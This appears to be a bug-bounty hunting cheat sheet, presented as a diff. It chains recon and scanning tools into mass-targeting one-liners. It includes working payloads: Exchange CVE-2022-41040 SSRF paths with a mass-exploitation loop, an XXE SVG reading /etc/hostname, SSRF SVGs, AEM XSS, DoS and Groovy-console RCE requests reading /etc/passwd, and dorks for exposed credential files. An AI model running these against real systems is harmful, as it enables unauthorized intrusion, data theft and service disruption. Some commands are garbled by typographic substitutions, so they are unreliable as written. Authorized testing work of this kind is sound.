@@ -1,0 +1,739 @@
+First:- find your target and get the subdomains via many tools on github,shodan,etc or use public-bugbounty-programs from chaos or arkadiyt.
+
+curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq “.[][] | select(.bounty==true) | .domains[]” -r > targets.txt
+
+curl -s “https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/domains.txt” | anew targets.txt
+
+curl -s “https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt” | anew target-wildcards.txt
+
+If you want to hunt on your account on bug bounty platforms use bbscope
+
+Hackerone
+
+bbscope h1 -a -u <username> -t <token> -b > bbscope-h1.txt
+
+Bugcrowd
+
+bbscope bc -t <token> -b > bbscope-bc.txt
+
+Intigriti
+
+bbscope it -t <token> -b > bbscope-it.txt
+
+Use this kali linux free VPS if you do not have money to purchase a paid VPS.
+
+https://shell.segfault.net/
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Install waymore to get the history of your target
+
+git clone https://github.com/xnl-h4ck3r/waymore.git /opt/waymore || git -C /opt/waymore pull
+
+pip3 install -r /opt/waymore/requirements.txt
+
+ln -s /opt/waymore//waymore.py /usr/local/bin/waymore
+
+chmod +x /usr/local/bin/waymore
+
+python error run
+
+sudo ln -s /usr/bin/python3 /usr/bin/python
+
+URLSCAN_API_KEY
+
+/opt/waymore/config.yml
+
+https://urlscan.io/user/profile/
+
+urls file:-
+
+cat url.txt | while read host do;do. waymore -i $host |anew /root/urls-his.txt ;done
+
+Single url
+
+waymore -i http://google.com |anew /root/google-his.txt
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Use gf Patterns:-
+
+cat urls-his | gf sql | anew sql
+
+cat urls-his | gf xss | anew xss
+
+cat urls-his | gf ssrf | anew ssrf
+
+cat urls-his | gf lfi |anew lfi
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Run ghauri to test for sql injection:-
+
+cat sql | while read host do;do ghauri -u $host — batch — level=3. -b — current-user — current-db — hostname — dbs ;done
+
+Run sqlmap to test for sql injection:-
+
+sqlmap -m sql -batch — random-agent — level 5 — risk 3
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Run knoxnl to test GET and POST XSS — KNOXSS API by Brute Logic, you must have a valid KNOXSS API key
+
+knoxnl -i xss -s -X BOTH
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+For non knoxss users you can use xsstrike
+
+Install it:-
+
+git clone https://github.com/s0md3v/XSStrike.git /opt/xsstrike || git -C /opt/xsstrike pull
+
+pip3 install -r /opt/xsstrike/requirements.txt
+
+ln -s /opt/xsstrike/xsstrike.py /usr/local/bin/xsstrike
+
+chmod +x /usr/local/bin/xsstrike
+
+Single url
+
+xsstrike -f url
+
+urls file:-
+
+xsstrike — seeds xss -t 10 — blind ( add your blind xss on /opt/xsstrike/core/config.py)
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+surf allows you to filter a list of hosts, returning a list of viable SSRF candidates
+
+surf -l ssrf -t 10 -c 200
+
+ssrf-finder
+
+cat ssrf | ssrf-finder
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Test for lfi via httpx or nuclei
+
+httpx -l lfi -paths /root/LFI-files -threads 100 -random-agent. -mc 200 -mr “root:[x*]:0:0:”
+
+nuclei -l urls-his -c 200 -tags lfi
+
+nuclei fuzzing templates
+
+nuclei -l urls-his -c 200 -t fuzzing-templates -s critical,high
+
+Run nuclei with some tags:-
+
+nuclei -c 500 -l urls.txt -t nuclei-templates/ -severity critical,high -ept ssl,tcp -tags cve,rce,log4j,grafana,tomcat,solar,apache,lfi,ssrf,sql,xxe,symfony,exposure,traversal,panel,default-login,confluence,vmware,vcenter -o url_results.txt
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Great script and some fuzzing templates
+
+NucleiFuzzer
+
+https://github.com/0xKayala/NucleiFuzzer
+
+Fuzz templates
+
+https://github.com/U53RW4R3/nuclei-fuzzer-templates
+
+https://github.com/projectdiscovery/fuzzing-templates
+
+https://github.com/pikpikcu/nuclei-fuzz
+
+https://github.com/vijay922/XXE-FUZZ
+
+https://github.com/MR-pentestGuy/nuclei-templates
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Sensitive files.
+
+cat urls | gauplus -subs | grep — -color -E. “.xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar”
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+secrets via nuclei exposures templates
+
+cat urls | gauplus -subs | grep “.js” |. httpx -content-type | grep ‘application/javascript’” | awk ‘{print $1}’ | nuclei. -t nuclei-templates/http/exposures/ -silent. > secrets.txt
+
+extract sensitive end-point in JS
+
+cat urls | gauplus -subs | grep “.js” | anew jsfiles.txt| cat jsfiles.txt | grep -oh “\”\/[a-zA-Z0–9_/?=&]*\”” | sed -e ‘s/^”//’ -e ‘s/”$//’ | sort -u
+
+secrets via burp suite
+
+cat jsfiles.txt | parallel -j 100 curl — proxy http://127.0.0.1:8080 -sk > /dev/null
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Send jsfiles.txt to burpsuite JS Miner extension form burp store.
+
+cat jsfiles.txt | parallel -j 100 curl — proxy http://127.0.0.1:8080 -sk > /dev/null
+
+Use GAP-Burp-Extension to find potential endpoints, parameters, and generate a custom target wordlist to test for IDORS.
+
+If you have found somthing you can use dirsearch to fuzz for some juicy files you can run it against multiple hosts
+
+cat hosts | xargs -I@ sh -c ‘python3 dirsearch.py -r 3 -t 500 -b -w path -u @ -i 200, 403, 401, 302 -e. conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json’ -x 400,500,429
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Run gospider and proxit it to burpsuite to collect more urls:-
+
+gospider -S urls-his -a -w — sitemap -r -c 20 -d 8 -p http://127.0.0.1:8080
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Blind xss match and replace or use burp extension auto-repeater or Femida
+
+^Referer.*$
+
+Referer: xsshunter
+
+^User-Agent.*$
+
+User-Agent:xsshunter
+
+Steps to Add Custom Header in Burp Requests
+
+Select Proxy -> Options
+
+Go to Match and Replace and select add
+
+Specify the details of the match and replace
+
+Type: Request Header
+
+Match: ^Referer.*$
+
+Replace : Referer: xsshunter
+
+Comment: Manually Added Header
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Femida
+
+Add your blind xss payloads on
+
+https://github.com/emadshanab/femida/blob/master/payloads.txt
+
+Install the tool and run the proxy and spiders
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+auto-repeater add Add Custom Header
+
+install auto-repeater from burp store
+
+go to auto-repeater tab
+
+Type : Add header
+
+Match: User-Agent
+
+Replace: User-Agent:xsshunter
+
+Which: Replace all
+
+Comment: User-Agent-blind xss
+
+Regex match : checked
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+log4j2Scan use burp extension auto-repeater
+
+Type : Add header
+
+Match: User-Agent
+
+Replace: User-Agent:https://canarytokens.org/generate
+
+Which: Replace all
+
+Comment: User-Agent-log4j2Scan
+
+Regex match : checked
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+log4j2Scan VIA log4j2Scan burp extension
+
+git clone https://github.com/pmiaowu/log4j2Scan
+
+install mvn
+
+apt-get install apache-maven
+
+Build the extension
+
+mvn package
+
+Register an account on https://ceye.io/
+
+Go to log4jScanBurp/target/log4jScan/resources/config.yml
+
+Change provider: “Ceye”
+
+Add your. other: “token=ceyetoken;Identifier=id.ceye.io;”
+
+Install the extension and just run proxy or passive or active scan and it will work to find log4j bug
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+You can use nuclei log4j templates
+
+https://github.com/reewardius/log4shell-templates
+
+https://github.com/emadshanab/Nuclei-Templates-Collection
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Proxyshell
+
+nuclei scanner for proxyshell ( CVE-2021–34473 )
+
+https://github.com/emadshanab/Proxyshell-Scanner
+
+nuclei -urls -t proxyshell.yaml -c 400 -o output.txt
+
+python3 CVE-2022–41040.py -u url and you will get a shell on the server
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+CVE-2022–41040-POC Server Side Request Forgery (SSRF) in Microsoft Exchange Server
+
+Manual exploiation
+
+Replace COLLABHERE with your OOB domain — sed ‘s/COLLABHERE/<oob-domain>/g
+
+Add payloads next to URLs you want to test — echo http://target.com|unfurl format %s://%d/<payload>
+
+Visit crafted URLs
+
+Check your collaborator
+
+Payloads:
+
+/autodiscover/autodiscover.json?@%d.v1.COLLABHERE/&Email=autodiscover/autodiscover.json%3f@%d.v1.COLLABHERE
+
+/autodiscover/autodiscover.json/v1.0/aa@%d.v2.COLLABHERE?Protocol=Autodiscoverv1
+
+/autodiscover/autodiscover.json/v1.0/aa..@%d.v3.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a..@%d.v3.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell
+
+/autodiscover/autodiscover.json/v1.0/aa@%d.v4.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a@%d.v4.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell
+
+/autodiscover/autodiscover.json?aa..%d.v5.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a..%d.v5.COLLABHERE&Protocol=Autodiscoverv1&%d.v5.COLLABHEREProtocol=Powershell
+
+/autodiscover/autodiscover.json?aa@%d.v6.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a@%d.v6.COLLABHERE&Protocol=Autodiscoverv1&%d.v6.COLLABHEREProtocol=Powershell
+
+/autodiscover/autodiscover.json?aa..%d.v7.COLLABHERE/owa/?&Email=aa@autodiscover/autodiscover.json?a..%d.v7.COLLABHERE&Protocol=Autodiscoverv1&%d.v7.COLLABHEREProtocol=Powershell
+
+/autodiscover/autodiscover.json?aa@%d.v8.COLLABHERE/owa/?&Email=aa@autodiscover/autodiscover.json?a@%d.v8.COLLABHERE&Protocol=Autodiscoverv1&%d.v8.COLLABHEREProtocol=Powershell
+
+/autodiscover/autodiscover.json/v1.0/aa@autodiscover/autodiscover.json?a..@%d.v9.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell
+
+Mass exploitation
+
+for url in $(curl -s https://gist.githubusercontent.com/kljunowsky/a2e8392f63fb8d7c0443f2011bce59ec/raw/7b4cabaa0dab7113b1cab00e1a2cb0c4e3c6ed06/cve-2022-41040-unfurl-payloads.txt|sed ‘s/COLLABHERE/<OOB-PAYLOAD>/g’); do cat targets.txt |unfurl format $url >> fuzz-ready.txt;done & ffuf -w fuzz-ready.txt -u FUZZ
+
+Check your collaborator!
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Use google dork to find upload forms to inject blind xss via svg file
+
+Dork: “Index of” “upload_image.php”
+
+Dork: “index of” “Production.json”
+
+index.of.?.frm
+
+intitle:”index of” “nrpe.cfg”
+
+index of admin/fckeditor/editor/filemanager/
+
+inurl:demo.browse.php intitle:getid3
+
+-site:simplemachines.org “These are the paths and URLs to your SMF installation”
+
+allinurl:forcedownload.php?file=
+
+ionCube Loader Wizard information disclosure
+
+vBulletin Install Page Detection
+
+inurl:”simplenews/admin”
+
+inurl:updown.php | intext:”Powered by PHP Uploader Downloader”
+
+inurl:guestbook/guestbooklist.asp “Post Date” From
+
+intitle:”CJ Link Out V1"
+
+“powered by my little forum”
+
+“powered by mailgust”
+
+intitle:”Control panel” “Control Panel Login” ArticleLive inurl:admin -demo
+
+inurl:cartwiz/store/index.asp
+
+“maxwebportal” inurl:”default” “snitz forums” +”homepage” -intitle:maxwebportal
+
+“e107.org 2002/2003" inurl:forum_post.php?nt
+
+“Warning:” “Cannot execute a blank command in”
+
+“Mail-it Now!” intitle:”Contact form” | inurl:contact.php
+
+“Powered by Xcomic”
+
+“Powered by FunkBoard”
+
+“Powered by FlexPHPNews” inurl:news | inurl:press
+
+PHPFreeNews inurl:Admin.php
+
+inurl:nquser.php filetype:php
+
+“Powered by SilverNews”
+
+“Powered by Gravity Board”
+
+“Powered By: Simplicity oF Upload” inurl:download.php | inurl:upload.php
+
+filetype:mdb “standard jet” (password | username | user | pass)
+
+intitle:”PHPstat” intext:”Browser” intext:”PHPstat setup”
+
+intitle:”SSHVnc Applet”OR intitle:”SSHTerm Applet”
+
+inurl:cgi-bin inurl:bigate.cgi
+
+filetype:pl -intext:”/usr/bin/perl” inurl:webcal (inurl:webcal | inurl:add | inurl:delete | inurl:config)
+
+filetype:mdb inurl:”news/news”
+
+inurl:php.exe filetype:exe -example.com
+
+“Powered by Land Down Under 601"
+
+ext:asp “powered by DUForum” inurl:(messages|details|login|default|register) -site:duware.com
+
+ext:asp inurl:DUgallery intitle:”3.0" -site:dugall
+
+filetype:cgi inurl:cachemgr.cgi
+
+“powered by YellDL”
+
+“File Upload Manager v1.3" “rename to”
+
+inurl:click.php intext:PHPClickLog
+
+intitle:”phpremoteview” filetype:php “Name, Size,
+
+intitle:”ASP FileMan” Resend -site:iisworks.com
+
+ezBOO “Administrator Panel” -cvs
+
+intitle:mywebftp “Please enter your password”
+
+intitle:”Directory Listing” “tree view”
+
+inurl:changepassword.cgi -cvs
+
+inurl:” WWWADMIN.PL” intitle:”wwwadmin”
+
+inurl:cgi.asx?StoreID
+
+filetype:lit lit (books|ebooks)
+
+“create the Super User” “now by clicking here”
+
+intitle:gallery inurl:setup “Gallery configuration”
+
+inurl:”nph-proxy.cgi” “Start browsing through this CGI-based proxy”
+
+link:http://www.toastforums.com/
+
+inurl:”plog/register.php”
+
+inurl:robpoll.cgi filetype:cgi
+
+intitle:”PHP Explorer” ext:php (inurl:phpexplorer.php | inurl:list.php | inurl:browse.php)
+
+ext:cgi inurl:ubb6_test.cgi
+
+filetype:inc inc intext:setcookie
+
+filetype:wsdl wsdl
+
+filetype:cnf my.cnf -cvs -example
+
+filetype:php inurl:”viewfile” -”index.php” -”idfil
+
+intitle:”Index of /” modified php.exe
+
+Blind XSS in SVG FILE — change blind xss url and save it to any name as blindxss.svg or any extension like jpg,png.ico etc…
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Do not forget to inject a SSRF via uploading svg file
+
+.
+
+SSRF in SVG FILE — change ssrf. url and save it to any name as blindxss.svg or any extension like jpg,png.ico etc…
+
+.
+
+.
+
+SSRF in SVG FILE
+
+.
+
+.
+
+. <?xml version=”1.0" encoding=”UTF-8" standalone=”no”?>
+
+<svg xmlns:svg=”http://www.w3.org/2000/svg” xmlns=”http://www.w3.org/2000/svg” xmlns:xlink=”http://www.w3.org/1999/xlink” width=”200" height=”200">
+
+<image height=”200" width=”200" xlink:href=”http://<EXAMPLE_SERVER>/image.jpeg” />
+
+</svg>
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+XXE attack via SVG
+
+An SVG “image” that uses an XXE attack to embed the hostname file of whichever system processes it into the image itself
+
+<?xml version=”1.0" standalone=”yes”?><!DOCTYPE test [ <!ENTITY xxe SYSTEM “file:///etc/hostname” > ]><svg width=”128px” height=”128px” xmlns=”http://www.w3.org/2000/svg” xmlns:xlink=”http://www.w3.org/1999/xlink” version=”1.1"><text font-size=”16" x=”0" y=”16">&xxe;</text></svg>
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Hunt for Adobe Experience Manager (AEM)
+
+Find AEM hosts via nuclei and aem-hacker
+
+nuclei -l urls -tags aem -c 500 -o aem-resulte
+
+python3 aem_discoverer.py — file urls.txt — workers 150
+
+Top AEM misconfiguration
+
+Here is how to find Bug on Adobe Experience Manager :
+
+1) Collect as many subdomains as you can and find the technology of aem can use Nuclei templet for it.
+
+2) fuzz the parameters of aem — https://github.com/clarkvoss/AEM-List/blob/main/paths
+
+3) aem tools useful for testing — https://github.com/0ang3el/aem-hacker
+
+4) cve-2016–0957
+
+https://aemsite/bin/querybuilder.json/a.css. => allow
+
+https://aemsite/bin/querybuilder.json/a.html. => allow
+
+https://aemsite/bin/querybuilder.json;%0aa.css. => allow
+
+https://aemsite/bin/querybuilder.json/a.1.json. => allow
+
+5) xss
+
+POST //////content/usergenerated/etc/commerce/smartlists/vv.json
+
+or , POST /content/usergenerated/etc/commerce/smartlists/xss
+
+aa=alert(‘xss+on+’%2b+document.domain+%2b+’\nby+%400ang3el+\ud83d\ude00')%3b
+
+6) DOs attacks
+
+/bin/querybuilder.json?type=nt:base&p.limit=-1
+- /content.assetsearch.json?query=*&start=0&limit=10&random=123
+- /..assetsearch.json?query=*&start=0&limit=10&random=123
+- /system/bgservlets/test.json?cycles-999999&interval=0&flushEvery=111111111
+7) SSRF
+
+ssrf via Opensocial proxy
+
+— /libs/opensocial/proxy?container=default&url=http://target
+
+— /libs/shindig/proxy?container=default&url=http://target
+
+SSRF via ReportingServicesProxyServlet (CVE-2018–12809)
+
+-/libs/ca/contentinsight/content/proxy.reportingservices.json?url=
+
+/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url=http://target%23/apil.omniture.com/a&q=a
+- /libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://target&customer_key=zzzz&customer_secret-zzzz&redirect_uri=xxxx&code=e
+SSRF via SiteCatalystServlet
+- /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet
+- /libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json
+ssrf should allow to send GET request and see response
+- Opensocial proxy
+- ssrf in (cve-2018–12809)
+8) interesting servlets
+
+https://aemsite/bin/querybuilder.json.servlet.css. => allow
+
+https://aemsite/bin/querybuilder.json.servlet.html => allow
+
+https://aemsite/bin/querybuilder.json.servlet.ico. => allow
+
+https://aemsite/bin/querybuilder.json.servlet.png. => allow
+
+///etc.json
+
+9) RCE
+
+POST /bin/groovyconsole/post.servlet HTTP/1.1
+
+script=sef+proc+%3d+”cat+/etc/passwd”.execute()%0d%0aprintln+proc.txt
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —
+
+Tools used and references:-
+
+https://github.com/r0oth3x49/ghauri
+
+https://github.com/xnl-h4ck3r/knoxnl
+
+https://github.com/random-robbie/ssrf-finder
+
+https://github.com/tomnomnom/gf
+
+https://github.com/emadshanab/Gf-Patterns-Collection
+
+https://github.com/hussein98d/LFI-files
+
+https://github.com/assetnote/surf/
+
+https://github.com/random-robbie/ssrf-finder
+
+https://github.com/emadshanab/Blind-XSS-burp-match-and-replace
+
+https://github.com/PortSwigger/auto-repeater
+
+https://github.com/emadshanab/femida
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
+
+https://gist.github.com/rootsploit/66c9ae8fc3ef387fa5ffbb67fcef0766
+
+https://bxsshunter.com/
+
+https://xsshunter.trufflesecurity.com/
+
+https://xsshunter.com/
+
+https://xss.report/
+
+https://knoxss.me/
+
+https://github.com/xnl-h4ck3r/GAP-Burp-Extension
+
+https://hackerone.com/reports/223203
+
+https://sm4rty.medium.com/hunting-for-bugs-in-file-upload-feature-c3b364fb01ba
+
+https://infosecwriteups.com/svg-ssrfs-and-saga-of-bypasses-777e035a17a7
+
+https://www.exploit-db.com/docs/49732
+
+https://gist.github.com/jakekarnes42/b879f913fd3ae071c11199b9bd7ba3a7?short_path=f3432ae
+
+https://hackerone.com/reports/845832
+
+https://github.com/0ang3el/aem-hacker
+
+https://github.com/ZephrFish/Wordlists/tree/master
+
+https://github.com/orwagodfather/My-WordLISTs/tree/main
+
+https://github.com/clarkvoss/AEM-List/tree/main
+
+https://github.com/pmiaowu/log4j2Scan
+
+https://github.com/emadshanab/Bug-Bounty-Tips-Collection
+
+https://github.com/emadshanab/Oneliner-Bug-Bounty-Collection
+
+https://github.com/kljunowsky/CVE-2022-41040-POC
+
+https://twitter.com/0day_exploit_/status/1719608600035807328?s=43&t=xWT5sBWOPrvX-OphaqPtqA
+
+https://buaq.net/go-90376.html
+
+https://github.com/emadshanab/Content-Discovery-Web-Dir-Bruteforce-wordlists-Collection
+
+https://github.com/emadshanab/Subdomains-brutforce-wordlists-collection
+
+https://github.com/emadshanab/SAP-wordlist
+
+https://github.com/emadshanab/DIR-WORDLISTS
+
+https://github.com/sw33tLie/bbscope
+
+https://flawed.net.nz/2019/01/14/WebApp-Testing-With-AutoRepeater/
+
+https://censys.io
+
+https://spyce.com
+
+https://shodan.io
+
+https://viz.greynoise.io
+
+https://zoomeye.org
+
+https://onyphe.io
+
+https://wigle.net
+
+https://intelx.io
+
+https://fofa.so
+
+https://hunter.io
+
+https://zorexeye.com
+
+https://pulsedive.com
+
+https://netograph.io
+
+https://vigilante.pw
+
+https://pipl.com
+
+https://abuse.ch
+
+https://cert.sh
+
+https://maltiverse.com/search
+
+https://insecam.org
+
+https://jldc.me/anubis/subdomains/
+
+https://dnsdumpster.com
+
+https://phonebook.cz
+
+https://labs.inquest.net
+
+https://scylla.sh
+
+https://hunter.how
+
+https://synapsint.com
